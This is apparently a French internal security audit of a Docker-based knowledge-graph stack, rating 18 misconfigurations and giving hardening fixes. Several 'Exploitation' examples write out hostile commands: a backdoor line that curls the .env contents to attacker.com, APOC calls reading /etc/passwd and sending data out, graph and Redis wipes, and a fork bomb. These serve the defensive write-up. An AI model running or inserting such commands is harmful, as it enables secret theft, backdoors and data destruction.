# Audit Sécurité Phase 0 - Analyse Complète

**Date** : 2025-10-03
**Scope** : Phase 0 - Clean Slate Setup (infrastructure Docker)
**Sévérité** : 🔴 Critique | 🟠 Élevée | 🟡 Moyenne | 🟢 Faible

---

## 📋 Résumé Exécutif

**Failles identifiées** : 18 vulnérabilités
- 🔴 **Critiques** : 5
- 🟠 **Élevées** : 7
- 🟡 **Moyennes** : 4
- 🟢 **Faibles** : 2

**Score sécurité global** : **3.5/10** ⚠️ CRITIQUE

**Recommandation** : **Durcissement URGENT requis avant déploiement production**

---

## 🔴 VULNÉRABILITÉS CRITIQUES (P0)

### 1. Mot de Passe Neo4j par Défaut Hardcodé 🔴

**Fichier** : `docker-compose.infra.yml:72`, `.env.example:23`

**Problème** :
```yaml
NEO4J_AUTH=neo4j/${NEO4J_PASSWORD:-neo4j_password}
```
Mot de passe par défaut `neo4j_password` hardcodé dans fallback.

**Impact** :
- ✅ Accès root Neo4j trivial pour attaquant
- ✅ Exfiltration totale knowledge graph (facts, entities)
- ✅ Injection données malveillantes
- ✅ Déni de service (DROP DATABASE)

**Exploitation** :
```bash
# Attaquant peut se connecter immédiatement
cypher-shell -u neo4j -p neo4j_password -a bolt://target:7687
> MATCH (n) DETACH DELETE n;  // Supprimer tout le graph
```

**CVSS Score** : 9.8 (Critique)

**Correctif** :
```yaml
# docker-compose.infra.yml
environment:
  - NEO4J_AUTH=neo4j/${NEO4J_PASSWORD:?NEO4J_PASSWORD non défini}
  # Fail fast si NEO4J_PASSWORD absent

# .env.example
NEO4J_PASSWORD=CHANGE_ME_STRONG_PASSWORD_MIN_32_CHARS
```

**Politique mot de passe** :
- Minimum 32 caractères
- Alphanumériques + symboles
- Rotation tous les 90 jours
- Stockage dans gestionnaire secrets (Vault, AWS Secrets Manager)

---

### 2. Redis Sans Authentification 🔴

**Fichier** : `docker-compose.infra.yml:37-53`

**Problème** :
```yaml
redis:
  ports:
    - "6379:6379"
  command: redis-server --appendonly yes --maxmemory 512mb
  # ❌ Pas de --requirepass
```

**Impact** :
- ✅ Accès lecture/écriture Redis pour n'importe qui
- ✅ Lecture secrets si stockés en cache (API keys, tokens)
- ✅ Manipulation queue RQ (injection jobs malveillants)
- ✅ Déni de service (FLUSHALL)

**Exploitation** :
```bash
redis-cli -h target -p 6379
> KEYS *  # Liste toutes les clés
> GET api_keys  # Si secrets en cache
> FLUSHALL  # Supprimer tout
```

**CVSS Score** : 9.1 (Critique)

**Correctif** :
```yaml
# docker-compose.infra.yml
redis:
  command: >
    redis-server
    --appendonly yes
    --maxmemory 512mb
    --maxmemory-policy allkeys-lru
    --requirepass ${REDIS_PASSWORD:?REDIS_PASSWORD non défini}
    --rename-command FLUSHALL ""
    --rename-command FLUSHDB ""
    --rename-command CONFIG ""

# .env
REDIS_PASSWORD=CHANGE_ME_STRONG_PASSWORD_MIN_32_CHARS
REDIS_URL=redis://:${REDIS_PASSWORD}@redis:6379/0
```

---

### 3. Ports Sensibles Exposés Publiquement 🔴

**Fichier** : `docker-compose.infra.yml`, `docker-compose.app.yml`

**Problème** :
```yaml
ports:
  - "6333:6333"    # Qdrant - Pas d'auth par défaut
  - "6379:6379"    # Redis - Pas d'auth
  - "7474:7474"    # Neo4j Browser - Interface admin
  - "7687:7687"    # Neo4j Bolt - Accès direct
  - "5678:5678"    # Debug Python - Code execution
  - "5679:5679"    # Debug Worker - Code execution
```

**Impact** :
- ✅ Attack surface maximale (8 ports exposés)
- ✅ Scan ports trivial (nmap)
- ✅ Exploitation directe sans proxy/reverse proxy
- ✅ Debug ports → Remote Code Execution

**Exploitation** :
```python
# Port 5678/5679 (debugpy) - Remote Code Execution
import debugpy
debugpy.connect(("target", 5678))
# Attaquant peut exécuter du code Python arbitraire
```

**CVSS Score** : 8.8 (Élevé/Critique selon environnement)

**Correctif** :

**Option A : Bind localhost uniquement** (dev local)
```yaml
ports:
  - "127.0.0.1:6333:6333"  # Accessible uniquement localhost
  - "127.0.0.1:6379:6379"
  - "127.0.0.1:7474:7474"
  - "127.0.0.1:7687:7687"
  # Debug ports: retirer complètement en production
```

**Option B : Reverse Proxy + Firewall** (production)
```yaml
# Supprimer tous les ports exposés
# Accès via Nginx/Traefik reverse proxy uniquement
# Firewall iptables limitant IPs autorisées
```

**Option C : VPN/Bastion** (production sécurisée)
```
Accès infrastructure uniquement via VPN ou bastion host
Zéro port exposé publiquement
```

---

### 4. Volumes Montés en Read-Write (Code Source) 🔴

**Fichier** : `docker-compose.app.yml:36-40`

**Problème** :
```yaml
volumes:
  - ./app:/app           # ❌ RW sur code applicatif
  - ./src:/app/src       # ❌ RW sur code source
  - ./config:/app/config # ❌ RW sur configuration
  - ./tests:/app/tests   # ❌ RW sur tests
```

**Impact** :
- ✅ Container compromis → modification code source
- ✅ Backdoor persistant dans codebase
- ✅ Exfiltration secrets depuis config/
- ✅ Injection malware dans dependencies

**Exploitation** :
```bash
# Attaquant avec accès container
docker exec knowbase-app bash
echo "import os; os.system('curl attacker.com/$(cat .env)')" >> main.py
# Backdoor persistant, même après restart
```

**CVSS Score** : 8.5 (Élevé)

**Correctif** :

**Développement** :
```yaml
# docker-compose.dev.yml (dev local uniquement)
volumes:
  - ./app:/app:ro          # Read-only
  - ./src:/app/src:ro
  - ./config:/app/config:ro
  # Sauf data/ qui peut être RW
  - ./data:/data
```

**Production** :
```yaml
# docker-compose.prod.yml
# ❌ AUCUN volume source code monté
# Code intégré dans image Docker au build
# Configuration via variables d'environnement ou secrets manager
```

---

### 5. Pas de Limitation Ressources (DoS) 🔴

**Fichier** : `docker-compose.infra.yml`, `docker-compose.app.yml`

**Problème** :
```yaml
# Aucune limite CPU/Memory définie
services:
  qdrant:
    # ❌ Pas de limits/reservations
  neo4j:
    # ❌ Pas de limits (peut consommer toute la RAM)
```

**Impact** :
- ✅ Container malveillant → consomme 100% CPU/RAM
- ✅ Déni de service host
- ✅ OOM Killer tue processus critiques
- ✅ Fork bomb possible

**Exploitation** :
```python
# Dans container compromis
while True:
    os.fork()  # Fork bomb
    # Consomme toute la RAM jusqu'à crash host
```

**CVSS Score** : 7.5 (Élevé)

**Correctif** :
```yaml
# docker-compose.infra.yml
services:
  qdrant:
    deploy:
      resources:
        limits:
          cpus: '2.0'
          memory: 4G
        reservations:
          cpus: '1.0'
          memory: 2G
    ulimits:
      nproc: 512    # Limite nombre processus
      nofile: 4096  # Limite fichiers ouverts

  redis:
    deploy:
      resources:
        limits:
          cpus: '1.0'
          memory: 1G

  neo4j:
    deploy:
      resources:
        limits:
          cpus: '4.0'
          memory: 8G  # Cohérent avec NEO4J_server_memory_heap_max__size=2g
```

---

## 🟠 VULNÉRABILITÉS ÉLEVÉES (P1)

### 6. API Keys en Clair dans .env 🟠

**Fichier** : `.env.example:3,6`

**Problème** :
```env
OPENAI_API_KEY=your_openai_api_key_here
ANTHROPIC_API_KEY=your_anthropic_api_key_here
```

**Impact** :
- ✅ `.env` committé accidentellement → keys leakées
- ✅ Accès filesystem container → exfiltration keys
- ✅ Logs verbeux → keys loguées
- ✅ Coûts financiers (utilisation API frauduleuse)

**CVSS Score** : 7.8 (Élevé)

**Correctif** :

**Développement** :
```bash
# .env (gitignored)
OPENAI_API_KEY=sk-...

# .env.example (committé)
OPENAI_API_KEY=your_openai_api_key_here
```

**Production** :
```yaml
# docker-compose.prod.yml
services:
  app:
    environment:
      # Secrets injectés via secrets manager
      OPENAI_API_KEY: ${OPENAI_API_KEY}  # Depuis AWS Secrets Manager
    secrets:
      - openai_api_key

secrets:
  openai_api_key:
    external: true  # Géré par Docker Swarm secrets ou Kubernetes
```

**Bonnes pratiques** :
- `.gitignore` strict (`.env`, `*.key`, `*.pem`)
- Pre-commit hook vérifiant absence secrets
- Secrets rotation automatique (AWS Lambda)
- Monitoring utilisation API (alertes anomalies)

---

### 7. Neo4j APOC Procedures Unrestricted 🟠

**Fichier** : `docker-compose.infra.yml:80-81`

**Problème** :
```yaml
- NEO4J_dbms_security_procedures_unrestricted=apoc.*
- NEO4J_dbms_security_procedures_allowlist=apoc.*
```

**Impact** :
- ✅ APOC permet exécution OS commands (`apoc.run.command`)
- ✅ Lecture fichiers système (`apoc.load.csv`, `apoc.export`)
- ✅ Connexions réseau arbitraires (`apoc.load.json` URL externe)
- ✅ Élévation privilèges potentielle

**Exploitation** :
```cypher
// Exécution commande OS
CALL apoc.run.command('cat /etc/passwd');

// Exfiltration données
CALL apoc.load.json('https://attacker.com?data=' + facts);
```

**CVSS Score** : 7.2 (Élevé)

**Correctif** :
```yaml
# docker-compose.infra.yml
environment:
  # Whitelist strict procédures nécessaires uniquement
  - NEO4J_dbms_security_procedures_allowlist=apoc.path.*,apoc.create.*,apoc.periodic.*
  - NEO4J_dbms_security_procedures_unrestricted=  # Vide par défaut

  # Blacklist procédures dangereuses
  - NEO4J_dbms_security_procedures_blacklist=apoc.run.*,apoc.load.jdbc,apoc.export.*
```

**Principe du moindre privilège** : N'autoriser QUE les procédures APOC strictement nécessaires.

---

### 8. Qdrant Sans Authentification 🟠

**Fichier** : `docker-compose.infra.yml:11-32`

**Problème** :
```yaml
qdrant:
  ports:
    - "6333:6333"
  # ❌ Pas de QDRANT__SERVICE__API_KEY
```

**Impact** :
- ✅ Lecture/écriture collections Qdrant sans auth
- ✅ Exfiltration embeddings (propriété intellectuelle)
- ✅ Injection vectors malveillants (pollution dataset)
- ✅ Suppression collections

**CVSS Score** : 7.5 (Élevé)

**Correctif** :
```yaml
# docker-compose.infra.yml
qdrant:
  environment:
    - QDRANT__SERVICE__API_KEY=${QDRANT_API_KEY:?QDRANT_API_KEY non défini}
    - QDRANT__SERVICE__ENABLE_TLS=true  # HTTPS
    - QDRANT__SERVICE__READ_ONLY=false  # Contrôle granulaire

# .env
QDRANT_API_KEY=CHANGE_ME_STRONG_API_KEY_MIN_32_CHARS

# app/docker-compose.app.yml
app:
  environment:
    QDRANT_URL: http://qdrant:6333
    QDRANT_API_KEY: ${QDRANT_API_KEY}
```

**Code Python** :
```python
from qdrant_client import QdrantClient

client = QdrantClient(
    url=os.getenv("QDRANT_URL"),
    api_key=os.getenv("QDRANT_API_KEY"),  # ✅ Authentification
    timeout=10
)
```

---

### 9. Logs Sensibles Non Sécurisés 🟠

**Fichier** : `docker-compose.infra.yml:85`

**Problème** :
```yaml
- NEO4J_dbms_logs_query_enabled=true  # ❌ Logs toutes queries Cypher
```

**Impact** :
- ✅ Logs contiennent queries avec données sensibles
- ✅ Passwords en clair si `CREATE USER` loggué
- ✅ PII (données personnelles) dans logs
- ✅ Compliance GDPR/RGPD violation

**Exemple log dangereux** :
```log
2025-10-03 INFO Query: MATCH (u:User {email: 'john@acme.com', ssn: '123-45-6789'})
```

**CVSS Score** : 6.5 (Moyen/Élevé)

**Correctif** :
```yaml
# docker-compose.infra.yml
neo4j:
  environment:
    - NEO4J_dbms_logs_query_enabled=INFO  # Niveau moins verbeux
    - NEO4J_dbms_logs_query_threshold=5s   # Seulement slow queries
    - NEO4J_dbms_logs_query_parameter_logging_enabled=false  # ✅ Pas de params

  volumes:
    - neo4j_logs:/logs:rw
    - ./log-scrubber.sh:/docker-entrypoint-initdb.d/log-scrubber.sh:ro
```

**Log scrubbing** :
```bash
# log-scrubber.sh
# Redact PII/secrets des logs avant persistence
sed -i 's/ssn: "[0-9-]*"/ssn: "***-**-****"/g' /logs/*.log
```

---

### 10. Restart Policy "unless-stopped" Sans Monitoring 🟠

**Fichier** : `docker-compose.infra.yml:15`, `docker-compose.app.yml:19`

**Problème** :
```yaml
restart: unless-stopped
```

**Impact** :
- ✅ Container crashloop → redémarrage infini sans alerte
- ✅ Bug exploitation → DoS silencieux
- ✅ Pas de circuit breaker
- ✅ Logs perdus si pas de monitoring

**CVSS Score** : 6.0 (Moyen)

**Correctif** :
```yaml
# docker-compose.infra.yml
services:
  qdrant:
    restart: on-failure:5  # Max 5 restart attempts
    healthcheck:
      test: ["CMD-SHELL", "wget --no-verbose --tries=1 --spider http://localhost:6333/health || exit 1"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 20s
    # + Alertes si unhealthy

# Monitoring externe (Prometheus)
- alertmanager:
    image: prom/alertmanager
    configs:
      - alert: ContainerUnhealthy
        expr: container_health_status == 0
        for: 5m
        action: send_pagerduty
```

---

### 11. Network Bridge Par Défaut (Pas d'Isolation) 🟠

**Fichier** : `docker-compose.infra.yml:127`

**Problème** :
```yaml
networks:
  knowbase_net:
    driver: bridge  # ❌ Tous containers peuvent communiquer
```

**Impact** :
- ✅ Frontend compromis → accès direct Redis/Neo4j
- ✅ Pas de segmentation réseau
- ✅ Lateral movement trivial
- ✅ Blast radius maximal

**CVSS Score** : 6.5 (Moyen/Élevé)

**Correctif** :

**Option A : Multiples networks** (isolation)
```yaml
# docker-compose.infra.yml
networks:
  backend_net:  # App + Redis + Neo4j + Qdrant
    driver: bridge
  frontend_net: # Frontend + App uniquement
    driver: bridge

services:
  neo4j:
    networks:
      - backend_net  # Pas exposé au frontend

  app:
    networks:
      - backend_net
      - frontend_net

  frontend:
    networks:
      - frontend_net  # Pas d'accès direct Neo4j
```

**Option B : Network policies** (Kubernetes)
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-neo4j-from-frontend
spec:
  podSelector:
    matchLabels:
      app: neo4j
  policyTypes:
    - Ingress
  ingress:
    - from:
      - podSelector:
          matchLabels:
            app: backend  # Seulement backend autorisé
```

---

### 12. Healthchecks Peu Sécurisés 🟠

**Fichier** : `docker-compose.app.yml:46`

**Problème** :
```yaml
healthcheck:
  test: ["CMD-SHELL", "wget --no-verbose --tries=1 --spider http://localhost:8000/status || exit 1"]
```

**Impact** :
- ✅ Endpoint `/status` potentiellement verbeux (info système)
- ✅ Pas d'authentification healthcheck
- ✅ DoS potentiel si healthcheck coûteux

**CVSS Score** : 5.5 (Moyen)

**Correctif** :
```python
# app/main.py - Endpoint healthcheck sécurisé
@app.get("/health", include_in_schema=False)  # ✅ Pas dans docs Swagger
async def health():
    """Healthcheck minimaliste (pas d'info sensible)"""
    return {"status": "ok"}  # ✅ Pas de version, hostname, etc.

@app.get("/readiness")
async def readiness():
    """Readiness check (vérifie dépendances)"""
    try:
        # Vérifier Redis
        redis.ping()
        # Vérifier Neo4j
        neo4j.verify_connectivity()
        return {"status": "ready"}
    except Exception:
        raise HTTPException(status_code=503, detail="Not ready")
```

```yaml
# docker-compose.app.yml
healthcheck:
  test: ["CMD-SHELL", "wget -q --spider http://localhost:8000/health"]
  interval: 30s
  timeout: 5s  # ✅ Timeout court
  retries: 3
```

---

## 🟡 VULNÉRABILITÉS MOYENNES (P2)

### 13. Mode Development Activé en Production 🟡

**Fichier** : `docker-compose.app.yml:44,104`

**Problème** :
```yaml
command: python -m uvicorn main:app --host 0.0.0.0 --port 8000 --reload
environment:
  - NODE_ENV=development
```

**Impact** :
- ✅ `--reload` recharge code à chaque modif (perf dégradée)
- ✅ Debug mode expose stack traces détaillées
- ✅ CORS permissif en dev
- ✅ Pas d'optimisations production

**CVSS Score** : 5.0 (Moyen)

**Correctif** :
```yaml
# docker-compose.prod.yml
app:
  command: >
    gunicorn main:app
    --workers 4
    --worker-class uvicorn.workers.UvicornWorker
    --bind 0.0.0.0:8000
    --access-logfile -
    --error-logfile -
    --log-level warning
  environment:
    ENVIRONMENT: production

frontend:
  command: npm run build && npm start
  environment:
    NODE_ENV: production
    NEXT_TELEMETRY_DISABLED: 1
```

---

### 14. Pas de Rate Limiting 🟡

**Impact** : Brute-force, credential stuffing, API abuse

**CVSS Score** : 5.5 (Moyen)

**Correctif** :
```python
# app/main.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address, default_limits=["100/minute"])
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

@app.post("/api/facts")
@limiter.limit("10/minute")  # Max 10 facts/minute
async def create_fact(...):
    ...
```

---

### 15. Pas de Validation Input Stricte 🟡

**Impact** : Injection Cypher, XSS, path traversal

**CVSS Score** : 6.0 (Moyen)

**Correctif** :
```python
# src/knowbase/facts/validators.py
from pydantic import BaseModel, Field, validator
import re

class FactCreate(BaseModel):
    subject: str = Field(..., min_length=1, max_length=500)
    predicate: str = Field(..., regex=r'^[a-zA-Z_][a-zA-Z0-9_]*$')
    value: float

    @validator('subject')
    def sanitize_subject(cls, v):
        # Prévenir injection Cypher
        if any(char in v for char in ['{', '}', '$', '`']):
            raise ValueError("Caractères interdits dans subject")
        return v.strip()
```

---

### 16. Pas de HTTPS/TLS 🟡

**Impact** : Man-in-the-middle, sniffing credentials

**CVSS Score** : 6.5 (Moyen en interne, Élevé si Internet)

**Correctif** :
```yaml
# nginx.conf (reverse proxy)
server {
    listen 443 ssl http2;
    ssl_certificate /etc/nginx/certs/fullchain.pem;
    ssl_certificate_key /etc/nginx/certs/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    location / {
        proxy_pass http://knowbase-app:8000;
        proxy_set_header X-Forwarded-Proto https;
    }
}
```

---

## 🟢 VULNÉRABILITÉS FAIBLES (P3)

### 17. Images Docker Sans Version Fixe 🟢

**Fichier** : `docker-compose.infra.yml:39`

**Problème** :
```yaml
image: redis:7.2-alpine  # ❌ Tag mutable (7.2 → 7.2.1, 7.2.2...)
```

**Correctif** :
```yaml
image: redis:7.2.4-alpine  # ✅ Version fixe
# Ou mieux: digest SHA256
image: redis@sha256:abc123...  # ✅ Immutable
```

---

### 18. Pas de Security Context (User Root) 🟢

**Problème** : Containers run as root par défaut

**Correctif** :
```yaml
services:
  app:
    user: "1000:1000"  # Non-root user
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
    cap_add:
      - NET_BIND_SERVICE  # Seulement capabilities nécessaires
```

---

## 📊 Priorisation Correctifs

### Phase Immédiate (Avant Phase 1)

1. 🔴 **Neo4j Password** : Variable requise, pas de fallback
2. 🔴 **Redis Auth** : `--requirepass` obligatoire
3. 🔴 **Debug Ports** : Retirer 5678/5679
4. 🟠 **API Keys Secrets** : Secrets manager ou .gitignore strict
5. 🟠 **Qdrant Auth** : API key requis

**Temps estimé** : 2-3 heures

### Phase Court Terme (Phase 1-2)

6. 🔴 **Ports Localhost** : Bind 127.0.0.1
7. 🔴 **Resource Limits** : CPU/Memory limits tous services
8. 🟠 **APOC Whitelist** : Restreindre procédures
9. 🟠 **Network Isolation** : Multiples networks
10. 🟡 **Rate Limiting** : API throttling

**Temps estimé** : 1 jour

### Phase Moyen Terme (Phase 3-4)

11. 🟠 **Log Scrubbing** : Redact PII
12. 🟠 **Healthchecks Sécurisés** : Endpoints minimalistes
13. 🟡 **Production Mode** : Gunicorn, pas de --reload
14. 🟡 **Input Validation** : Pydantic validators stricts
15. 🟡 **HTTPS/TLS** : Reverse proxy Nginx

**Temps estimé** : 2-3 jours

### Phase Long Terme (Phase 5-6)

16. 🔴 **Volumes Read-Only** : Code immutable en prod
17. 🟢 **Images Versionnées** : SHA256 digests
18. 🟢 **Security Context** : Non-root user

**Temps estimé** : 1 jour

---

## 🛡️ Checklist Durcissement

### Infrastructure

- [ ] Neo4j password > 32 chars, rotation 90j
- [ ] Redis `--requirepass` activé
- [ ] Qdrant API key configuré
- [ ] Ports bind localhost uniquement (dev)
- [ ] Resource limits tous containers
- [ ] Network isolation (backend/frontend séparé)
- [ ] Volumes read-only (production)
- [ ] Images Docker versions fixes (SHA256)

### Application

- [ ] API keys dans secrets manager
- [ ] `.env` dans `.gitignore` strict
- [ ] Pre-commit hook scan secrets
- [ ] Rate limiting API endpoints
- [ ] Input validation Pydantic
- [ ] HTTPS/TLS activé (reverse proxy)
- [ ] CORS configuration stricte
- [ ] Security headers (CSP, HSTS, X-Frame-Options)

### Monitoring

- [ ] Alertes container unhealthy
- [ ] Logs centralisés (ELK/Loki)
- [ ] Audit trail toutes actions sensibles
- [ ] Monitoring utilisation API (coûts)
- [ ] Scan vulnérabilités images (Trivy, Snyk)

### Compliance

- [ ] Log scrubbing PII/secrets
- [ ] GDPR: droit à l'oubli implémenté
- [ ] Backup chiffrés
- [ ] Disaster recovery plan
- [ ] Politique mots de passe documentée

---

## 🔧 Fichiers Correctifs à Créer

1. `docker-compose.infra.secure.yml` (hardened)
2. `docker-compose.app.secure.yml` (hardened)
3. `.env.example.secure` (template sécurisé)
4. `scripts/security-check.sh` (pre-deployment)
5. `docs/SECURITY_POLICY.md` (politique sécurité)

---

## 📚 Références

- **OWASP Docker Security** : https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html
- **CIS Docker Benchmark** : https://www.cisecurity.org/benchmark/docker
- **Neo4j Security** : https://neo4j.com/docs/operations-manual/current/security/
- **Redis Security** : https://redis.io/docs/management/security/

---

**Créé le** : 2025-10-03
**Auteur** : Audit Sécurité Phase 0
**Version** : 1.0
**Statut** : 🔴 ACTION REQUISE
